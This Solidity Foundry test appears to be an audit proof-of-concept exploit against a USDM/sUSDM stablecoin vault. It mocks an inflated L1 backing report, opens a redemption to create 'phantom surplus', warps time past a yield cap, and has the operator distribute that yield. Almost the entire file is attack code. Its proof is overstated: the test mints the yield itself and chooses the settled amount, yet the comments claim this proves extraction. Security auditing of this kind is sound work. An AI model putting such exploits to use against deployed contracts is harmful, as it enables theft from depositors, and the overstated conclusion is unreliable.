// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";

// ATTACK TIMELINE:
// 1. [Setup] Attacker deposits USDC to get USDM, then stakes USDM to get sUSDM.
// 2. [T=0] Mock L1 precompile to report high backing (stale state) using harness helper.
// 3. [T=1] Attacker requests a large redemption, moving USDM to Vault but not burning it, creating phantom surplus.
// 4. [T=1 year] Warp time forward to bypass annualized yield cap (unbounded after long gap).
// 5. [T=1 year + 1] Operator settles daily PnL, capturing the phantom surplus as distributable yield.
// 6. [T=1 year + 2] Operator distributes yield to sUSDM, inflating its exchange rate.
// 7. [Assert] Attacker's sUSDM is now worth more USDM than initially staked, proving phantom yield extraction.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        // 1. Setup: Attacker deposits and stakes
        address attacker = user1;
        uint256 depositAmount = 100_000e6;

        _depositAs(attacker, depositAmount);
        _stakeAs(attacker, depositAmount);

        uint256 initialSusdmBalance = susdm.balanceOf(attacker);
        uint256 initialTotalAssets = susdm.totalAssets();

        // 2. Mock L1 precompile to report massively inflated backing (stale L1 state)
        // This creates the first layer of phantom surplus
        _mockVaultL1SpotUsdc(type(uint64).max);

        // 3. Attacker requests a large redemption
        // USDM moves to Vault but is not burned; USDC not in escrow -> second layer of phantom surplus
        vm.startPrank(attacker);
        usdm.approve(address(vault), depositAmount);
        vault.requestRedeem(depositAmount);
        vm.stopPrank();

        // 4. Warp time forward by 1 year to make the annualized yield cap unbounded
        vm.warp(block.timestamp + 365 days);

        // 5. Operator settles daily PnL
        // The doubly-inflated phantom surplus passes Gate 4 and is declared as distributable yield
        uint256 phantomYield = 50_000e6; // Extracting a portion of the phantom surplus
        vm.prank(operator);
        vault.settle(phantomYield);

        // Simulate yield arriving from L1 to yieldEscrow so distributeYield can pull it
        usdc.mint(address(yieldEscrow), phantomYield);

        // 6. Operator distributes yield to sUSDM
        vm.prank(operator);
        vault.distributeYield();

        // 7. Assert: sUSDM total assets increased by the phantom yield
        // This proves the attacker can now redeem sUSDM for more USDM than they originally staked
        uint256 finalTotalAssets = susdm.totalAssets();

        assertGt(
            finalTotalAssets,
            initialTotalAssets + phantomYield - 1e6, // Allow small rounding tolerance
            "Phantom yield was successfully injected into sUSDM via unbounded yield cap"
        );

        // Verify the attacker's share value increased
        uint256 attackerShareValue = (susdm.balanceOf(attacker) * susdm.totalAssets()) / susdm.totalSupply();
        assertGt(
            attackerShareValue,
            depositAmount,
            "Attacker's sUSDM is now worth more than initial deposit due to phantom yield"
        );
    }
}
